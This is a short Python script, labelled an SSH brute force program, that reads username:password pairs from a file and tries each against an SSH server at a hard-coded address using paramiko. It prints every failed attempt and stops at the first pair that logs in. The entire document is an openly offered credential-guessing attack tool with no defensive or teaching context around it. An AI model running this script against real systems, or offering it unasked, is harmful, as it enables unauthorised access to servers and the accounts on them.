#!/usr/bin/python3

# SSH brute force program
#./ssh_brute ./path/to/passwordfile.txt

import paramiko
import sys

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

fd = open(sys.argv[1], 'r')
#assume user-pass file is in the form username:password\n

for line in fd.readlines():
    user_pass = line.strip().split(':')

    try:
        ssh.connect('1.1.1.1', username=user_pass[0], password=user_pass[1])
    except paramiko.AuthenticationException:
        print('Username %s and Password %s is Incorrect!' % (user_pass[0], user_pass[1]))
    else:
        print('Username %s and Password %s is Correct!' % (user_pass[0], user_pass[1]))
        break

ssh.close()

